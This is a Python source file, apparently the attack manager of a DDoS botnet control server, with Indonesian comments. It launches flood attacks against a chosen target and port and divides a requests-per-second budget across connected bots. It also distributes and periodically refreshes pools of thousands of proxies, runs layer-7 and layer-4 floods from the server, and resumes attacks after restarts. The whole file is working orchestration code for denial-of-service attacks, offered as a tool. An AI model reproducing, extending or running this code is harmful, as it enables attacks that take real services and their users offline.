import asyncio
import time
import uuid
from typing import Dict, Optional, List, Callable, Awaitable
from datetime import datetime

from app.core.config import settings
from app.core.logger import logger, log_attack_event
from app.core.redis_client import get_redis, RedisKeys
from app.core.models import AttackStatus, AttackRequest, AttackResult

from app.managers.concurrent_manager import concurrent_manager
from app.managers.history_manager import history_manager
from app.managers.proxy_manager import proxy_manager
from app.managers.botnet_manager import botnet_manager

from app.engine.layer7 import run_layer7_attack
from app.engine.layer4 import run_layer4_attack


class AttackManager:
    """
    Manajer serangan utama dengan per-bot RPS distribution + PROXY AUTO-ATTACH.
    Fully synchronized dengan botnet_manager dan proxy_manager.
    """

    def __init__(self):
        self.active_attacks: Dict[str, AttackStatus] = {}
        self.attack_tasks: Dict[str, asyncio.Task] = {}
        self._stop_event = asyncio.Event()
        self._lock = asyncio.Lock()

    # ===================== PUBLIC API =====================

    async def start_attack(self, req: AttackRequest) -> str:
        """
        Start serangan baru dengan PROXY AUTO-ATTACH ke bot.
        Synchronized dengan botnet_manager.broadcast_attack_with_proxies()
        """
        # Cek concurrent
        async with self._lock:
            current_active = len(self.active_attacks)
            max_conc = await concurrent_manager.get_max()
            if current_active >= max_conc:
                raise Exception(f"Max concurrent attacks reached ({max_conc})")

            attack_id = str(uuid.uuid4())
            start_ts = int(time.time())

            attack = AttackStatus(
                id=attack_id,
                method=req.method,
                target=req.target,
                port=req.port,
                start_time=start_ts,
                duration=req.duration,
                hold_time=req.hold_time or 0,
                rps=0,
                total_requests=0,
                proxy_count_current=0
            )

            self.active_attacks[attack_id] = attack

        await self._save_attack_to_redis(attack)

        # ---- BACA RPS LIMIT ----
        rps_limit = await self._get_rps_limit()

        # ---- GET PROXIES DARI POOL ----
        proxies = await proxy_manager.get_mixed_proxies(count=2000)
        if not proxies:
            logger.warning("[ATTACK] No proxies in pool! Running emergency refresh...")
            await proxy_manager.emergency_refresh()
            proxies = await proxy_manager.get_mixed_proxies(count=2000)

        proxy_count = len(proxies)
        logger.info(f"[ATTACK] Fetched {proxy_count} proxies from pool")

        # ---- GET BOT COUNT ----
        bot_ids = await botnet_manager.get_active_bot_ids()
        bot_count = len(bot_ids)

        if bot_count == 0:
            logger.warning(f"⚠️ No bots connected. Attack will run on server only.")
            rps_per_bot = rps_limit
        else:
            if rps_limit > 0:
                rps_per_bot = max(1, rps_limit // bot_count)
            else:
                rps_per_bot = 0
            logger.info(f"📊 Distribution: {rps_limit} RPS / {bot_count} bots = {rps_per_bot} RPS/bot | {proxy_count} proxies")

        # ---- FIX: Gunakan botnet_manager.broadcast_attack_with_proxies() ----
        # Ini yang bikin semua sinkron — proxy di-distribute oleh botnet_manager
        if bot_count > 0 and proxies:
            attack_data = {
                "attack_id": attack_id,
                "method": req.method,
                "target": req.target,
                "port": req.port,
                "duration": req.duration,
                "hold_time": req.hold_time or 0,
                "rps_limit": rps_per_bot,
                "extra": "",
            }

            # Panggil botnet_manager untuk distribute proxy ke semua bot
            result = await botnet_manager.broadcast_attack_with_proxies(attack_data, proxies)
            logger.info(f"📡 Botnet broadcast result: {result}")
        elif bot_count > 0:
            # No proxies — send attack without (bot will warn)
            for bot_id in bot_ids:
                asyncio.create_task(
                    botnet_manager.send_to_bot(bot_id, {
                        "cmd": "attack",
                        "attack_id": attack_id,
                        "method": req.method,
                        "target": req.target,
                        "port": req.port,
                        "duration": req.duration,
                        "hold_time": req.hold_time or 0,
                        "rps_limit": rps_per_bot,
                        "proxies": [],
                    })
                )
            logger.warning(f"📡 Sent attack to {bot_count} bots WITHOUT proxies!")

        # ---- Jalankan direct attack dari server ----
        task = asyncio.create_task(self._run_direct_attack(attack_id, rps_limit, proxies))
        self.attack_tasks[attack_id] = task

        # ---- Start mid-attack proxy refresh kalo attack > 5 menit ----
        if req.duration > 300:
            asyncio.create_task(self._mid_attack_proxy_refresh(attack_id, req.duration))

        log_attack_event(attack_id, "started", {
            "method": req.method,
            "target": req.target,
            "port": req.port,
            "duration": req.duration,
            "hold_time": req.hold_time,
            "concurrent": len(self.active_attacks),
            "rps_limit": rps_limit,
            "bots": bot_count,
            "rps_per_bot": rps_per_bot if bot_count > 0 else rps_limit,
            "proxies": proxy_count,
        })

        return attack_id

    # Mid-attack proxy refresh (12H stability)
    async def _mid_attack_proxy_refresh(self, attack_id: str, duration: int):
        """Auto-refresh proxy tiap 3 menit selama attack berjalan."""
        refresh_interval = 180
        max_refreshes = max(0, (duration // refresh_interval) - 1)

        logger.info(f"[REFRESH] Mid-attack refresh for {attack_id}: {max_refreshes} refreshes")

        for i in range(max_refreshes):
            await asyncio.sleep(refresh_interval)

            if attack_id not in self.active_attacks:
                logger.info(f"[REFRESH] Attack {attack_id} ended. Stopping refresh.")
                break

            try:
                fresh_proxies = await proxy_manager.get_mixed_proxies(count=1500)
                if not fresh_proxies:
                    logger.warning(f"[REFRESH] No fresh proxies for {attack_id}")
                    continue

                # Gunakan botnet_manager untuk broadcast refresh
                result = await botnet_manager.broadcast_proxy_refresh(attack_id, fresh_proxies)
                logger.info(f"[REFRESH] Attack {attack_id} refreshed #{i+1}: {result}")

            except Exception as e:
                logger.error(f"[REFRESH] Error refreshing {attack_id}: {e}")

        logger.info(f"[REFRESH] Completed for {attack_id}")

    async def stop_attack(self, attack_id: str) -> bool:
        """Stop attack yang sedang berjalan (manual)."""
        async with self._lock:
            if attack_id not in self.active_attacks:
                return False

            if attack_id in self.attack_tasks:
                self.attack_tasks[attack_id].cancel()
                del self.attack_tasks[attack_id]

            attack = self.active_attacks.pop(attack_id, None)

        await self._remove_attack_from_redis(attack_id)

        asyncio.create_task(
            botnet_manager.broadcast_command({
                "cmd": "stop",
                "attack_id": attack_id
            })
        )

        if attack:
            avg_rps = attack.total_requests // max(1, attack.duration)
            await history_manager.add_entry(
                domain=attack.target,
                method=attack.method,
                avg_rps=avg_rps,
                total_requests=attack.total_requests,
                duration=attack.duration
            )
            log_attack_event(attack_id, "stopped", {
                "total_requests": attack.total_requests,
                "avg_rps": avg_rps
            })

        return True

    async def stop_all_attacks(self) -> int:
        """Stop semua attack yang sedang berjalan."""
        attack_ids = list(self.active_attacks.keys())
        count = 0
        for aid in attack_ids:
            if await self.stop_attack(aid):
                count += 1
        return count

    def get_active_attacks(self) -> List[AttackStatus]:
        return list(self.active_attacks.values())

    def get_attack(self, attack_id: str) -> Optional[AttackStatus]:
        return self.active_attacks.get(attack_id)

    async def get_total_rps(self) -> int:
        return sum(a.rps for a in self.active_attacks.values())

    async def get_total_requests(self) -> int:
        return sum(a.total_requests for a in self.active_attacks.values())

    async def restore_from_redis(self):
        r = await get_redis()
        attack_ids = await r.smembers(RedisKeys.active_attacks())
        if not attack_ids:
            logger.info("No active attacks to restore from Redis.")
            return

        restored = 0
        for aid in attack_ids:
            data = await r.hgetall(RedisKeys.attack(aid))
            if not data:
                continue
            try:
                for field in ["port", "start_time", "duration", "hold_time", "rps", "total_requests", "proxy_count_current"]:
                    if field in data:
                        data[field] = int(data[field])
                attack = AttackStatus(**data)
                self.active_attacks[aid] = attack
                task = asyncio.create_task(self._run_direct_attack(aid, 0, []))
                self.attack_tasks[aid] = task
                restored += 1
                log_attack_event(aid, "restored", {
                    "method": attack.method,
                    "target": attack.target,
                    "elapsed": attack.elapsed
                })
            except Exception as e:
                logger.error(f"Failed to restore attack {aid}: {e}")
                await self._remove_attack_from_redis(aid)

        logger.info(f"Restored {restored} active attacks from Redis.")

    async def update_attack_rps(self, attack_id: str, new_rps: int) -> bool:
        """Update RPS limit untuk attack yang sedang berjalan."""
        if attack_id not in self.active_attacks:
            logger.warning(f"Attack {attack_id} not found, cannot update RPS")
            return False

        bot_ids = await botnet_manager.get_active_bot_ids()
        bot_count = len(bot_ids)

        if bot_count == 0:
            logger.warning(f"No bots connected, cannot redistribute RPS for {attack_id}")
            return False

        rps_per_bot = max(1, new_rps // bot_count)
        logger.info(f"🔄 Redistributing RPS for {attack_id}: {new_rps} total / {bot_count} bots = {rps_per_bot} per bot")

        for bot_id in bot_ids:
            asyncio.create_task(
                botnet_manager.send_to_bot(bot_id, {
                    "cmd": "update_rps",
                    "attack_id": attack_id,
                    "rps_limit": rps_per_bot,
                })
            )

        log_attack_event(attack_id, "rps_updated", {
            "new_rps": new_rps,
            "bots": bot_count,
            "rps_per_bot": rps_per_bot
        })

        return True

    # ===================== INTERNAL METHODS =====================

    async def _get_rps_limit(self) -> int:
        redis = await get_redis()
        value = await redis.get("scythe:config:attack_rps_limit")
        if value is None:
            return getattr(settings, "ATTACK_RPS_LIMIT", 0)
        return int(value)

    async def _run_direct_attack(self, attack_id: str, rps_limit: int = 0, proxies: List[str] = None):
        """Jalankan serangan langsung dari server (menggunakan engine)."""
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return

        if attack.method.lower() in ["spectre", "vortex", "titan", "phantom", "serpent", "storm"]:
            engine_func = run_layer7_attack
        else:
            engine_func = run_layer4_attack

        total_duration = attack.duration + (attack.hold_time or 0)

        try:
            if not proxies:
                proxies = await proxy_manager.get_mixed_proxies(count=500)
            proxy_count = len(proxies)
            await self._update_attack_stats(attack_id, 0, 0, proxy_count)

            await engine_func(
                attack_id=attack_id,
                target=attack.target,
                port=attack.port,
                method=attack.method,
                duration=attack.duration,
                hold_time=attack.hold_time or 0,
                proxies=proxies,
                on_update=self._update_attack_stats,
                rps_limit=rps_limit,
            )
        except asyncio.CancelledError:
            logger.info(f"Direct attack {attack_id} cancelled")
        except Exception as e:
            logger.error(f"Direct attack {attack_id} error: {e}")
        finally:
            if attack_id in self.active_attacks:
                await self._finalize_attack(attack_id)

    async def _update_attack_stats(self, attack_id: str, rps: int, total_requests: int, proxy_count: int):
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return

        attack.rps = rps
        attack.total_requests = total_requests
        attack.proxy_count_current = proxy_count

        await self._save_attack_to_redis(attack)

    async def _finalize_attack(self, attack_id: str):
        async with self._lock:
            if attack_id not in self.active_attacks:
                return

            attack = self.active_attacks.pop(attack_id, None)
            if attack_id in self.attack_tasks:
                del self.attack_tasks[attack_id]

            await self._remove_attack_from_redis(attack_id)

        if attack:
            avg_rps = attack.total_requests // max(1, attack.duration)
            await history_manager.add_entry(
                domain=attack.target,
                method=attack.method,
                avg_rps=avg_rps,
                total_requests=attack.total_requests,
                duration=attack.duration
            )
            log_attack_event(attack_id, "completed", {
                "total_requests": attack.total_requests,
                "avg_rps": avg_rps,
                "duration": attack.duration
            })

    # ===================== REDIS HELPERS =====================

    async def _save_attack_to_redis(self, attack: AttackStatus):
        r = await get_redis()
        key = RedisKeys.attack(attack.id)
        await r.hset(key, mapping=attack.model_dump())
        await r.sadd(RedisKeys.active_attacks(), attack.id)

    async def _remove_attack_from_redis(self, attack_id: str):
        r = await get_redis()
        await r.delete(RedisKeys.attack(attack_id))
        await r.srem(RedisKeys.active_attacks(), attack_id)


# ========== SINGLETON INSTANCE ==========
attack_manager = AttackManager()